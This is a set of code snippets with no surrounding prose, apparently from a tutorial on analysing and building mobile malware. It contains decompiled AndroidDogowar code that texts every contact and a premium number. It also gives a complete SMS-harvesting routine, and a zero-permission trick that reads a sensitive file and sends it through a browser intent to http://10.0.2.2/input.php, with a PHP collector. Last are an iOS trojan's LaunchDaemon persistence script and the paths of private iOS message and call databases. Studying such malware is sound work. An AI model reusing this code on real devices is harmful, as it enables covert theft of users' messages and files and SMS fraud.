["```\n    **/path/to/dex2jar/d2j-dex2jar.bat /path/to/AndroidDogowar.apk**\n\n    ```", "```\nCursor localCursor1 = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null); \n\n```", "```\nif (localCursor1.getCount() > 0); \n    String str; \n    do \n    { \n      if (!localCursor1.moveToNext()) \n        return; \n      str = localCursor1.getString(localCursor1.getColumnIndex(\"_id\")); \n    } \n    while (Integer.parseInt(localCursor1.getString(localCursor1.getColumnIndex(\"has_phone_number\"))) <= 0); \n\n```", "```\nCursor localCursor2 = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, \"contact_id = \" + str, null, null);  \n\n```", "```\nlocalSmsManager.sendTextMessage(localCursor2.getString(localCursor2.getColumnIndex(\"data1\")), null, \"I take pleasure in hurting small animals, just thought you should know that\", null, null); \n\n```", "```\nif (!localCursor2.moveToNext()) \n      { \n        localSmsManager.sendTextMessage(\"73822\", null, \"text\", null, null); \n        break; \n      } \n\n```", "```\n**apktool d C:\\<path_to_apk>**\n\n```", "```\n**Python setup.py install**\n\n```", "```\n    **python androlyze.py -s**\n\n    ```", "```\n    **a,d,dx = AnalyzeAPK(\"path_to_apk\", decompiler=\"dad\")**\n\n    ```", "```\n    **a.get_permissions()**\n\n    ```", "```\n    **d.get_classes_names()**\n\n    ```", "```\n    **d.get_strings()**\n    **d.get_methods()**\n\n    ```", "```\n    **python androapkinfo.py -i <path_of_apk>**\n\n    ```", "```\n    **python androdiff.py -i <first apk> <second apk>** \n\n    ```", "```\n       public ArrayList<String> smsBuffer = new ArrayList<String>(); \n        String smsFile = \"SMS\"+\".csv\"; \n        private void  backupSMS(){ \n         smsBuffer.clear(); \n         Uri mSmsinboxQueryUri = Uri.parse(\"content://sms\"); \n         Cursor cursor1 = getContentResolver().query(mSmsinboxQueryUri, new String[] {\n         \"_id\", \"thread_id\", \"address\", \"person\", \"date\", \"body\", \"type\" }, null, null, null); \n        String[] columns = new String[] { \"_id\", \"thread_id\", \"address\", \"person\", \"date\", \"body\", \"type\"}; \n        if (cursor1.getCount() > 0) { \n          String count = Integer.toString(cursor1.getCount()); \n          Log.d(\"Count\", count); \n          while (cursor1.moveToNext()) { \n          String messageId = cursor1.getString(cursor1.getColumnIndex(columns[0])); \n          String threadId = cursor1.getString(cursor1.getColumnIndex(columns[1])); \n          String address = cursor1.getString(cursor1.getColumnIndex(columns[2])); \n          String name = cursor1.getString(cursor1.getColumnIndex(columns[3])); \n          String date = cursor1.getString(cursor1.getColumnIndex(columns[4])); \n          String msg = cursor1.getString(cursor1.getColumnIndex(columns[5])); \n          String type = cursor1.getString(cursor1.getColumnIndex(columns[6])); \n          smsBuffer.add(messageId + \",\" + threadId + \",\" + address + \",\" + name + \",\" + date + \" ,\n          \" + msg + \" ,\"+ type); \n         } \n         generateCSVFileForSMS(smsBuffer); \n        } \n      } \n      private void generateCSVFileForSMS(ArrayList<String>list) \n      { \n       try \n       { \n        String storage_path = Environment.getExternalStorageDirectory().toString()+File.separator+ smsFile; \n        System.out.println(\"Balle!!!!!!\"); \n        FileWriter write = new FileWriter(storage_path); \n        write.append(\"messageId, threadId, Address, Name, Date, msg, type\"); \n        write.append('\\n'); \n        for (String s : list) \n        { \n         write.append(s); \n         write.append('\\n'); \n        } \n        write.flush(); \n        write.close(); \n       } \n       catch (NullPointerException e) \n       { \n         System.out.println(\"Nullpointer Exception \"+e); \n       } \n       catch (IOException e) \n       { \n        e.printStackTrace(); \n       } \n       catch (Exception e) \n       { \n        e.printStackTrace(); \n       } \n      } \n\n    ```", "```\n    backupSMS(); \n\n    ```", "```\n    import android.database.Cursor; \n    import android.net.Uri; \n    import android.os.Bundle; \n    import android.os.Environment; \n    import android.support.v7.app.ActionBarActivity; \n    import android.util.Log; \n    import android.view.Menu; \n    import android.view.MenuItem; \n    import java.io.File; \n    import java.io.FileWriter; \n    import java.io.IOException; \n    import java.util.ArrayList; \n\n    ```", "```\n    <uses-permission android:name=\"android.permission.WRITE_SMS\"/> \n    <uses-permission android:name=\"android.permission.READ_SMS\"/> \n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/> \n    <uses-permission android:name=\"android.permission.MOUNT_UNMOUNT_FILESYSTEMS\"/> \n\n    ```", "```\n    **adb shell**\n\n    ```", "```\n    **cd sdcard**\n    **ls**\n\n    ```", "```\n    **cat SMS.csv**\n\n    ```", "```\npublic ArrayList<String> smsBuffer = new ArrayList<String>(); \n  String smsFile = \"SMS\"+\".csv\"; \n  private void  backupSMS(){ \n    smsBuffer.clear(); \n    Uri mSmsinboxQueryUri = Uri.parse(\"content://sms\"); \n    Cursor cursor1 = getContentResolver().query(mSmsinboxQueryUri, new String[] { \"_id\", \"thread_id\", \"address\", \"person\", \"date\", \"body\", \"type\" }, null, null, null); \n    String[] columns = new String[] { \"_id\", \"thread_id\", \"address\", \"person\", \"date\", \"body\", \"type\" }; \n\n```", "```\nif (cursor1.getCount() > 0) { \n  String count = Integer.toString(cursor1.getCount()); \n  Log.d(\"Count\", count); \n  while (cursor1.moveToNext()) { \n    String messageId = cursor1.getString(cursor1.getColumnIndex(columns[0])); \n    String threadId = cursor1.getString(cursor1.getColumnIndex(columns[1])); \n    String address = cursor1.getString(cursor1.getColumnIndex(columns[2])); \n    String name = cursor1.getString(cursor1.getColumnIndex(columns[3])); \n    String date = cursor1.getString(cursor1.getColumnIndex(columns[4])); \n    String msg = cursor1.getString(cursor1.getColumnIndex(columns[5])); \n    String type = cursor1.getString(cursor1.getColumnIndex(columns[6])); \n\n```", "```\n    smsBuffer.add(messageId + \",\"+ threadId+ \",\"+ address + \",\" + name + \",\" + date + \" ,\" + msg + \" ,\" + type); \n  } \n  generateCSVFileForSMS(smsBuffer); \n} \n\n```", "```\n  String storage_path = Environment.getExternalStorageDirectory().toString() + File.separator + smsFile; \n  FileWriter write = new FileWriter(storage_path); \n  write.append(\"messageId, threadId, Address, Name, Date, msg, type\"); \n  write.append('\\n'); \n  for (String s : list) \n  { \n    write.append(s); \n    write.append('\\n'); \n  } \n  write.flush(); \n  write.close(); \n} \n\n```", "```\n<uses-permission android:name=\"android.permission.READ_SMS\" /> \n\n```", "```\n    **adb shell**\n\n    ```", "```\n    **cd sdcard**\n    **echo \"Username: Akshay Password: secret123\" > sensitive.txt**\n\n    ```", "```\n    **cat /sdcard/sensitive.txt**\n\n    ```", "```\n    FileInputStream in; \n      BufferedInputStream buf; \n\n      Intent intent = getIntent(); \n      Bundle extras = intent.getExtras(); \n\n      StringBuffer sb = new StringBuffer(\"\"); \n      String line = \"\"; \n      String NL = System.getProperty(\"line.separator\"); \n      String str = \"cat /mnt/sdcard/sensitive.txt\"; \n\n      Process process = null; \n      try { \n        process = Runtime.getRuntime().exec(str); \n      } catch (IOException e) { \n         throw new RuntimeException(e); \n      } \n\n     BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); \n\n      int read; \n      char[] buffer = new char[4096]; \n      StringBuffer output = new StringBuffer(); \n      try { \n        while ((read = reader.read(buffer)) > 0) { \n          output.append(buffer, 0, read); \n        } \n      } catch (IOException e) { \n        throw new RuntimeException(e); \n      } \n\n      try { \n        reader.close(); \n      } catch (IOException e) { \n         throw new RuntimeException(e); \n      } \n      try { \n        process.waitFor(); \n      } catch (InterruptedException e) { \n\n      } \n      String data = output.toString(); \n\n      startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"http://10.0.2.2/input.php?input=\" + data))); \n\n    ```", "```\n    import android.content.Intent; \n    import android.net.Uri; \n    import android.support.v7.app.ActionBarActivity; \n    import android.os.Bundle; \n    import android.util.Log; \n    import android.view.Menu; \n    import android.view.MenuItem; \n    import java.io.*; \n\n    ```", "```\n    <?php \n        $File = \"output.txt\";  \n        $Handle = fopen($File, 'w'); \n        $Data =  $_GET['input'];  \n        fwrite($Handle, $Data); \n        fclose($Handle);  \n    } \n    ?> \n\n    ```", "```\nFileInputStream in; \nBufferedInputStream buf; \nIntent intent = getIntent(); \nBundle extras = intent.getExtras(); \nStringBuffer sb = new StringBuffer(\"\"); \n\n```", "```\n**cat /mnt/scard/sensitive.txt**\n\n```", "```\nprocess = Runtime.getRuntime().exec(str); \n\n```", "```\nBufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); \nint read; \nchar[] buffer = new char[4096]; \nStringBuffer output = new StringBuffer(); \n  try { \n    while ((read = reader.read(buffer)) > 0) { \n      output.append(buffer, 0, read); \n    } \n  } catch (IOException e) { \n      // TODO Auto-generated catch block \n    throw new RuntimeException(e); \n  } \n\n  try { \n    reader.close(); \n  } catch (IOException e) { \n    // TODO Auto-generated catch block \n    //e.printStackTrace(); \n    throw new RuntimeException(e); \n  } \n  // Waits for the command to finish. \n  try { \n    process.waitFor(); \n  } catch (InterruptedException e) { \n    // TODO Auto-generated catch block \n    //e.printStackTrace(); \n  } \n  String data = output.toString(); \n\n```", "```\nstartActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"http://10.0.2.2/input.php?input=\" + data))); \n\n```", "```\n    **ssh root@<ip_of_device>**\n\n    ```", "```\n**class-dump-z.exe \"C:\\Akshay\\output\\ios\\Contacts~iphone.app\\Contacts~iphone\" > Contacts-class_dump.txt** \n\n```", "```\n@interface SearchRequestHistoryItem : PersistentSearchRequestHistoryItem <HistoryItem> { \n} \n@property(readonly, assign, nonatomic) BOOL hasMultipleLocations; \n-(id)displayQuery; \n-(int)type; \n-(unsigned)hash; \n-(BOOL)isEqual:(id)equal; \n-(id)initWithRequest:(id)request displayQuery:(id)query location:(id)location hasMultipleLocations:(BOOL)locations; \n-(id)initWithRequest:(id)request displayQuery:(id)query location:(id)location; \n@end \n\n```", "```\n    #!/bin/sh\n    cp /bin/xsser.0day_t /bin/xsser.0day\n    cp /bin/com.xsser.0day.iphone.plist /Library/LaunchDaemons/com.xsser.0day.iphone.plist\n    chmod -R 0755 /bin/xsser.0day\n    chmod -R 0755 /Library/LaunchDaemons/com.xsser.0day.iphone.plist\n    chown root /Library/LaunchDaemons/com.xsser.0day.iphone.plist\n    launchctl load /Library/LaunchDaemons/com.xsser.0day.iphone.plist\n\n    ```", "```\n    **chown root /Library/LaunchDaemons/com.xsser.0day.iphone.plist**\n    **launchctl load /Library/LaunchDaemons/com.xsser.0day.iphone.plist**\n\n    ```", "```\n    <plist version=\"1.0\"> \n    <dict>  \n      <key>KeepAlive</key> \n      <true/> \n      <key>Label</key> \n      <string>com.xsser.0day.iphone</string> \n      <key>Program</key>  \n      <string>/bin/xsser.0day</string> \n      <key>RunAtLoad</key> \n      <true/> \n    </dict> \n    </plist> \n\n    ```", "```\n**/var/mobile/Library/AddressBook/AddressBook.sqlitedb**\n**/var/mobile/Library/AddressBook/AddressBook.sqlitedb-shm**\n**/var/mobile/Library/AddressBook/AddressBook.sqlitedb-wal**\n**/var/mobile/Library/SMS/sms.db**\n**/var/mobile/Library/SMS/sms.db-shm**\n**/var/mobile/Library/SMS/sms.db-wal**\n**/var/wireless/Library/CallHistory/call_history.db**\n\n```"]